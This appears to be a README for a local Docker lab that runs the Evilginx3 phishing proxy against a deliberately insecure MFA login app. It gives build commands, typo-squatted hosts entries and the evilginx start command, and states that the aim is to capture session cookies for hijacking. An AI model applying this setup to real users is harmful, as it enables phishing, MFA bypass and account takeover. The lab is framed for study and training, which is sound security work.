# Evilginx LAB on Docker
![back](evil-dock.jpg)

## Disclaimer
As you can imagine, this lab was created solely and exclusively for the purposes outlined in the<b>Why</b> section, and absolutely not for any malicious activity. Of course, I disclaim any responsibility for the improper use of the material contained in this repository.
The containers must absolutely not be exposed to a public network.

Please note that the comments inside files are in italian.

## Why?
I created a local lab to test Evilginx without the need to purchase a domain or presumably a VPS. It is useful for the following use cases:
1. Study and practice
2. Phishlet development and testing
3. Demonstrations and training activities

## Lab architecture
The lab consists of two Linux Docker containers. One hosts a simple PHP application that implements an MFA login process. The application is completely insecure, so it is strongly recommended not to expose it to the Internet and not to use the code in real-world applications. The second container hosts the Evilginx3 server.
You can find the static parameters to access the web application in <b>/app/login-config.php</b>

## Objective
Our goal is to intercept the authentication tokens (cookies) needed to hijack the user's session. It's very straightforward.

## Build & run the containers
Clone this repo and enter the directory, then execute:
	
	sudo docker-compose up --build -d --force-recreate --remove-orphans
	Building apache-php
	[+] Building 1.1s (11/11) FINISHED
	...
	Building evilginx2
	[+] Building 1.1s (10/10) FINISHED   
	...
	Creating targetsite.local ... done
	Creating targetsile.local ... done

	
Verify the containers:

	sudo docker ps
	CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS          PORTS               NAMES
	636fa17740bf   evilginx_lab-main_apache-php   "apachectl -D FOREGRâ€¦"   41 minutes ago   Up 41 minutes   80/tcp, 443/tcp     targetsite.local
	2c595290c650   evilginx_lab-main_evilginx2    "/bin/bash -l"           41 minutes ago   Up 41 minutes   443/tcp, 8080/tcp   targetsile.local


## Mimic DNS
Modify hosts file in your host machine. Add the following lines:

	172.18.0.20 	targetsite.local login.targetsite.local
	172.18.0.10	targetsile.local login.targetsile.local
	
Visit the Legitimate site at: https://login.targetsite.local, with a bit of typo-squatting, the evil site will be https://login.targetsile.local


## Start evilnginx
Enter Evilginix container shell

	sudo docker exec -it /targetsile.local /bin/bash
Then start Evilginix in developer mode, in this mode, instead of trying to obtain LetsEncrypt SSL/TLS certificates, it will automatically generate self-signed certificates.
```bash  

root@e279e8098a4d:/evilginx2# ./evilginx2 -debug -developer

Note that I used the debug option too, since, I don't know why at the moment, the phishlet refues to capture the otp credential. Using the debug options permit to get the whole requests.
